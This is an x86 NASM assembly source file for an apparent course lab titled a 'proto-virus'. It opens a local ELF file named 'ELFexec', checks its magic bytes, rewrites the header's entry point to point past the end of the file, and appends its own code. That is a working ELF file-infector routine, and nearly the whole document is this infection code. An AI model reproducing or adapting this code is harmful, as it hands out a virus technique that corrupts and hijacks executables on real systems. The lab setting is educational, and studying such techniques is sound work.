%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro getLoc 1
	get_my_loc
	sub ecx, next_i - %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here

call get_my_loc
sub ecx, next_i - OutStr		; getting relative address of OutStr
write 1, ecx, 32				; acts as 'write(stdout, [OutStr], 32)'

; open the file
call get_my_loc
sub ecx, next_i - FileName		; getting relative address of FileName
mov eax, ecx					; ecx is being changed in macro syscall3 before we use the address we stored here,
								; eax used last so it will be reserved correctrly
open eax, RDWR, 0777			; acts as 'open("ELFexec", RDWR, 0777)
mov dword [ebp - 4], eax		; store on stack the return value, which is the file descriptor

mov eax, [ebp-4]				; is neccessery?
cmp eax, 0
jl printErr						; ???


; load file header
sub ebp, 84						; make room for header
read eax, ebp, 80				; reads 80bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
mov esi, ebp					; store header in esi
add ebp, 84						; clean header from the stack

; check the file is ELF file
mov ebx, esi
inc ebx
cmp byte [ebx], 69				; cmp e_ident[1] with 'E'
jnz printErr
inc ebx
cmp byte [ebx], 76				; cmp e_ident[2] with 'L'
jne printErr
inc ebx
cmp byte [ebx], 70				; cmp e_ident[3] with 'F'
jne printErr

mov eax, dword [ebp-4]
lseek eax, 52, SEEK_SET

mov edi, ebp
sub edi, 200
mov eax, dword [ebp-4]
read eax, edi, 32
mov edx, dword [edi+8]
mov dword [ebp-8], edx
mov edx, 0


; load program headers
;sub ebp, 40						; make room for program headers
;mov eax, dword [ebp-4]
;read eax, ebp, 32				; reads 32bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
;mov edi, ebp
;add ebp, 40


; find the size of the file, in order to use it as offset when writing virus
mov eax, dword [ebp-4]          ; load file descriptor from stak
lseek eax, 0, SEEK_END
mov dword [ebp-12], eax			;store file zise on stack 

mov ebx, [ebp-8]				; get virtual adress
add ebx, [ebp-12]				; change virtual adress to the adress of the end of the file (at runtime)

; change entry point
mov eax, dword [ebp-4]			; get file descriptor
mov dword [esi + 24], ebx
lseek eax, 0, SEEK_SET			; get location of entry point address
mov eax, dword [ebp-4]
write eax, esi, 52				; write the new address to instead of the old entry point file


; write the virus to the end of the file
call get_my_loc
sub ecx, next_i-_start
mov eax, [ebp-4]
write eax, ecx, virus_end-_start

; close the file
mov eax, [ebp-4]
close eax

; check if closed with no error
cmp eax, 0
jl printErr
jmp VirusExit

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

printErr:
	call get_my_loc
	sub ecx, next_i - Failstr		; getting absoulte address of Failstr
	write 2, ecx, 13				; acts as 'write(sterr, [Failstr], 13)'
	exit 1


	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret

PreviousEntryPoint: dd VirusExit
virus_end:


